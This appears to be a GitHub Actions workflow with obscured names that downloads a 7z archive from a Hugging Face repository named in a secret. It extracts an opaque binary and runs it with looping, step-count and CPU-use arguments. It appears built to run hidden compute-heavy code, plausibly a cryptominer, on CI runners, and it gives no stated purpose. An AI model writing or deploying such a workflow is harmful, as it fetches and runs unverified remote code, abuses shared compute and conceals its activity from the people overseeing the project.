name: desk
on:
  workflow_dispatch:
    inputs:
      amd_override:
        description: 'OvAMD'
        required: false
        default: 'v3'
        type: string
      loop_override:
        description: 'OvLoop'
        required: false
        default: '10'
        type: string
env:
  REPO_DIR: ${{ github.workspace }}
  TARG: v1.0.0_${{ github.event.inputs.amd_override }}
  MVCP: ${{ github.event.inputs.loop_override }}
  ENV_MYWEB: ${{ secrets.ENV_MYWEB }}
  ENV_ADS: ${{ secrets.ENV_ADS }}
  ENV_DISD: ${{ secrets.ENV_DISD }}
  HF_REPO: ${{ secrets.HF_REPO }}
  GTER: 'huggingface'
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v7
      - name: Save
        timeout-minutes: 36
        run: |
          curl -o sav.7z \
            -L --url "https://${{ env.GTER }}.co/${{ env.HF_REPO }}/resolve/main/doit_${{ env.TARG }}.7z?download=true"
          7z x sav.7z
          rm -rf sav.7z && mv doit sav
          chmod +x sav
          ./sav loop ${{ env.MVCP }} steps 1000000 wait 0 cpu 3
